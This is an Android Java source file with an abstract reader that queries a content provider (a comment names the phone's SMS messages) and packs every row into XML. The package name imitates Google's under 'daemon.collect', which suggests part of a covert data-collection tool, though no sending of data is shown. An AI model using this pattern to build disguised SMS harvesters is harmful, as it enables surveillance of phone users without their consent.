/**
 * @(#) ProviderRead.java Created on 2013-1-19
 *
 * Copyright (c) 2013 com.braver. All Rights Reserved
 */
package com.google.android.daemon.collect.read;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;

import com.google.android.daemon.Const;
import com.google.android.daemon.Log;
import com.google.android.daemon.Util;

/**
 * The class <code>ProviderRead</code>
 * 
 * @author ouyangfeng
 * @version 1.0
 */
public abstract class ProviderReader {

    protected Context mContext;

    protected ProviderReader(Context mContext) {
        this.mContext = mContext;
    }

    /**
     * provide read
     * 
     * @return
     */
    public StringBuffer read() {
        StringBuffer buffer = null;

        final Cursor cur = mContext.getContentResolver().query(getUri(), getProjection(), null, null, getSortOrder()); // 获取手机内部短信
        if (cur.moveToFirst()) {

            Log.d("----------" + cur.getColumnCount());
            final int[] columnIndexs = new int[getProjection().length];
            for (int i = 0; i < columnIndexs.length; i++)
                columnIndexs[i] = cur.getColumnIndex(getProjection()[i]); // get index

            buffer = new StringBuffer(Const.XML_HEAD);
            buffer.append(Util.builderXmlOneTAG(getRootTag(), false, false, true));// add xml head

            do {
                // add context
                final String con = readRow(columnIndexs, cur);
                buffer.append(con);

            } while (cur.moveToNext());

            buffer.append(Util.builderXmlOneTAG(getRootTag(), false, true, true));// add xml foot

        }

        if (!cur.isClosed()) {
            cur.close();
        }

        return buffer;
    }

    protected abstract String readRow(int[] columnIndexs, Cursor cur);

    protected abstract String[] getProjection();

    protected abstract Uri getUri();

    protected abstract String getRootTag();

    protected String getSortOrder() {
        return null;
    }

}
